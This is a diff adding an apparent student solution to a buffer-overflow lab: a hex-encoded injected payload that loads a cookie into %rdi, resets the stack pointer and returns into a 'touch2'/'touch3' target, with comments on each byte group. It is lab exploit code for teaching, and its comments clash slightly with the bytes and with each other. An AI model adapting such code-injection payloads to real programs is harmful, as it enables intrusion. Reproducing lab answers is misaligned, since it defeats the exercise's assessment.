@@ -1,0 +1,14 @@
+48 c7 c7 78 43 27 2d 48 c7 c4 a7 e5 67 55 c3 d4 17 40 00 00 00 00 00 00 00 00 01 23 45 67 89 48 c7 c7 78 43 27 2d 5e 23 98 e5 67 55
+
+
+48 c7 c7 78 43 27 2d mov $0x2d274378, %rdi   # placed the cookie into rdi, the first argument
+
+48 c7 c4 a7 e5 67 55 mov $0x5567e5a2,%rsp    #here we are setting the stack pointer to the address we want to go to when we call ret in the next instruction. It was at this address space that I added the address to the touch3 function
+
+c3 retq    #this then goes to where %rsp is pointing to retrive the return address
+
+d4 17 40  #this is the address of touch2 in little endian ordering, notice this starts at 0x5567e5a2 as mentioned above
+
+everything until the next is just filler
+
+98 e5 67 55 - this is the address at the top of the stack where we initially began our instructions. This is what was placed as the return address.
